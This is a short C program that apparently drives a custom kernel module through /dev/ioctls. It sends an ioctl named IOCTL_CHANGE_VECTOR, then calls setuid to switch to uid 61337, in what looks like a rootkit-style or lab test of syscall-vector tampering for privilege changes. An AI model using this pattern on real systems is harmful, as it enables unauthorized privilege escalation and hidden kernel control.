#include<stdio.h>
#include<sys/types.h>
#include<unistd.h>
#include<sys/ioctl.h>

#define IOCTL_LIST_ALL _IOR(9, 2, char*)
#define IOCTL_CHANGE_VECTOR _IOR(9, 1, char*)

int main ()
{
  int fd, ret;  
  uid_t set_uid = 61337, get_uid;
  fd = open("/dev/ioctls",0);

  get_uid = getuid();
  printf("Old uid = %d\n", get_uid);

  ret = ioctl(fd, IOCTL_CHANGE_VECTOR, 3);
  setuid(set_uid);
  
  get_uid = getuid();
  printf("New uid = %d\n", get_uid);

  return 0;
}
